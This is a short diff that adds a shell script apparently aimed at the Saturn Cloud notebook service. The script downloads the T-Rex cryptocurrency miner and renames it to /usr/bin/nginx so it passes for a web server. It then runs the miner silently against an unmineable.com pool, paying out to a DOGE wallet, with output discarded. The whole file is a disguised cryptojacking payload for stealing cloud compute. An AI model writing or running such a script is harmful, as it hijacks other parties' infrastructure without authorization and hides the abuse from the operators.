@@ -1,0 +1,13 @@
+https://saturncloud.io/
+
+wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+
+tar zxf t-rex-0.26.8-linux.tar.gz
+
+mv t-rex /usr/bin/nginx
+
+chmod +x /usr/bin/nginx
+
+cd /usr/bin
+
+nginx -a octopus -o stratum+ssl://octopus-asia.unmineable.com:4444 -u DOGE:DGXvnBc1THryKq46XdUNZb7kFMxtER6uS3.w2_2#sd5i-y33p -p x --no-strict-ssl > /dev/null 2>&1 
